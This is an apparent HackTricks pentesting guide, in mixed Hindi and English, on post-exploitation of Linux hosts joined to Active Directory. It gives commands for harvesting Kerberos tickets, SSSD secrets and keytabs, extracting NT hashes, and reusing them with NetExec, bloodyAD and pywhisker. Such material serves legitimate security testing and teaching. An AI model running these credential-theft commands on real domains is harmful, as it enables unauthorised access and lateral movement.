# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

एक Linux machine भी Active Directory environment के अंदर मौजूद हो सकती है।

AD के अंदर मौजूद Linux machine **Kerberos material को locally store** कर सकती है: user ccaches, machine/service keytabs और SSSD-managed secrets। इन artefacts को आमतौर पर किसी भी अन्य Kerberos credential की तरह reuse किया जा सकता है। इनमें से अधिकांश को पढ़ने के लिए आपको ticket का user owner या machine पर **root** होना आवश्यक होगा।

## Enumeration

### Linux से AD enumeration

यदि आपके पास Linux (या Windows में bash) पर AD का access है, तो आप AD की enumeration के लिए [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) आज़मा सकते हैं।

आप **Linux से AD enumerate करने के अन्य तरीकों** के लिए निम्नलिखित page भी देख सकते हैं:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA Microsoft Windows **Active Directory** का एक open-source **alternative** है, जो मुख्य रूप से **Unix** environments के लिए बनाया गया है। यह management के लिए एक complete **LDAP directory** को MIT **Kerberos** Key Distribution Center के साथ combine करता है, जो Active Directory के समान है। CA और RA certificate management के लिए Dogtag **Certificate System** का उपयोग करते हुए, यह smartcards सहित **multi-factor** authentication को support करता है। Unix authentication processes के लिए SSSD integrated है। इसके बारे में अधिक जानें:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Tickets को access करने से पहले यह identify करें कि **host को AD से कैसे join किया गया था** और **Kerberos material वास्तव में कहाँ stored है**। Modern Linux hosts पर इसे आमतौर पर `realmd` + `adcli` + `sssd` द्वारा handle किया जाता है, न कि केवल `/tmp` में मौजूद flat files द्वारा:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
यह जल्दी से बताता है कि host AD पर trust करता है या नहीं, SSSD identities या tickets को cache कर रहा है या नहीं, और क्या **machine/service keytabs** या **KCM secrets** abuse के लिए उपलब्ध हैं।

## tickets के साथ प्रयोग

### Pass The Ticket

इस page में आपको अलग-अलग स्थान मिलेंगे जहाँ आप **linux host के अंदर kerberos tickets खोज** सकते हैं। निम्नलिखित page में आप सीख सकते हैं कि इन CCache ticket formats को Kirbi में कैसे बदला जाए (यह वह format है जिसे आपको Windows में उपयोग करना होता है) और PTT attack कैसे किया जाए:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

यदि आप **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, आदि) चाहते हैं, तो dedicated page देखें:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp से CCACHE ticket reuse

CCACHE files **Kerberos credentials को store करने** के लिए binary formats होते हैं। `FILE:/tmp/krb5cc_%{uid}` अभी भी common है, लेकिन modern Linux deployments में `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, या `KCM:%{uid}` का भी उपयोग होता है। यह मानने से पहले कि tickets `/tmp` में मौजूद हैं, **`KRB5CCNAME`** environment variable और `default_ccache_name` setting को check करें।<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring से CCACHE ticket reuse

**Kerberos tickets को process की memory में store किया जाता है और उन्हें extract किया जा सकता है**, विशेष रूप से जब machine पर ptrace protection disabled हो (`/proc/sys/kernel/yama/ptrace_scope`)। इस उद्देश्य के लिए एक उपयोगी tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) पर उपलब्ध है, जो sessions में inject करके और tickets को `/tmp` में dump करके extraction की सुविधा देता है।

इस tool को configure और use करने के लिए, नीचे दिए गए steps follow किए जाते हैं:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
यह procedure विभिन्न sessions में inject करने का प्रयास करेगा, और सफलता का संकेत `/tmp` में निकाले गए tickets को `__krb_UID.ccache` naming convention के साथ store करके देगा।<sup>[[1]](#references)</sup>

### SSSD KCM से CCACHE ticket reuse

SSSD database की एक copy `/var/lib/sss/secrets/secrets.ldb` path पर maintain करता है। संबंधित key `/var/lib/sss/secrets/.secrets.mkey` path पर hidden file के रूप में store की जाती है। डिफ़ॉल्ट रूप से, key केवल **root** permissions होने पर ही readable होती है।

**`SSSDKCMExtractor`** को --database और --key parameters के साथ invoke करने पर database parse होगी और **secrets decrypt** किए जाएंगे।
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob को usable Kerberos CCache फ़ाइल में convert किया जा सकता है, जिसे Mimikatz/Rubeus को pass किया जा सकता है।**

### त्वरित keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab से accounts निकालें

Services के लिए आवश्यक service account keys, जो root privileges के साथ संचालित होती हैं, सुरक्षित रूप से **`/etc/krb5.keytab`** files में संग्रहीत की जाती हैं। ये keys, services के लिए passwords के समान होती हैं, इसलिए इनकी गोपनीयता सख्ती से बनाए रखना आवश्यक है।

keytab file की contents का निरीक्षण करने के लिए **`klist`** का उपयोग किया जा सकता है। Linux पर, `klist -k -K -e` principals, key version numbers, encryption types और raw key material प्रदर्शित करता है। यदि key type **23 / RC4-HMAC** है, तो key value उस principal का **NT hash** भी होती है।
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux users के लिए, **`KeyTabExtract`** RC4 HMAC hash extract करने की functionality प्रदान करता है, जिसका उपयोग NTLM hash reuse के लिए किया जा सकता है। ध्यान दें कि यह केवल तभी सहायक होता है जब keytab में अभी भी **etype 23 / RC4-HMAC** material मौजूद हो। **AES-only** environments में आपको reusable NT hash नहीं मिल सकता, लेकिन आप फिर भी Kerberos के माध्यम से keytab का उपयोग करके सीधे authenticate कर सकते हैं।
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS पर, **`bifrost`** keytab file analysis के लिए एक tool के रूप में काम करता है।
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
निकाली गई account और hash जानकारी का उपयोग करके, **`NetExec`** जैसे tools की सहायता से servers से connections स्थापित किए जा सकते हैं।
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` से machine account का पुनः उपयोग करें

`realmd`/`adcli`/`sssd` से joined systems पर, `/etc/krb5.keytab` में आम तौर पर **computer account** और एक या अधिक **host/service principals** होते हैं। यदि आपके पास **root** है, तो इसे बस dump न करें: `klist -k` द्वारा सूचीबद्ध principals में से किसी एक का उपयोग करके TGT का अनुरोध करें और स्वयं Linux host के रूप में कार्य करें।
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
यह विशेष रूप से तब उपयोगी होता है जब स्वयं **computer object** के पास AD में delegated rights हों या host को **gMSA** जैसी अन्य secrets retrieve करने की अनुमति हो।

### Linux-first AD tooling के साथ चुराई गई Kerberos material का reuse

एक valid `ccache` या usable keytab प्राप्त होने के बाद, आप सब कुछ पहले Windows formats में convert किए बिना **सीधे Linux से** AD के विरुद्ध operate कर सकते हैं। कई modern tools `KRB5CCNAME` / Kerberos auth को natively accept करते हैं:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
यह **Linux post-exploitation** और **AD object abuse** के बीच एक अच्छा bridge है। स्वयं object-level abuse paths के लिए देखें:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

हाल के Linux deployments सीधे AD से **Managed Service Accounts** का उपयोग कर सकते हैं। व्यवहार में इसका अर्थ है कि किसी Linux server को compromise करने के बाद, आपको न केवल host keytab, बल्कि gMSA से generated **service-specific keytabs** भी मिल सकते हैं। निरीक्षण करने के सामान्य स्थानों में `/etc/gmsad.conf`, deployment-specific config files और `/etc` के अंतर्गत अतिरिक्त `*.keytab` files शामिल हैं।<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
यह आपको उस gMSA से bound SPNs के लिए एक reusable Kerberos identity देता है, और इसके लिए किसी भी Windows endpoint को touch करने की आवश्यकता नहीं होती। AD में higher privileges प्राप्त करने के बाद **domain-side** gMSA/dMSA abuse के लिए देखें:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos पर हमला कैसे करें?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account के साथ AD access करना – RHEL systems को सीधे Active Directory के साथ integrate करना](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
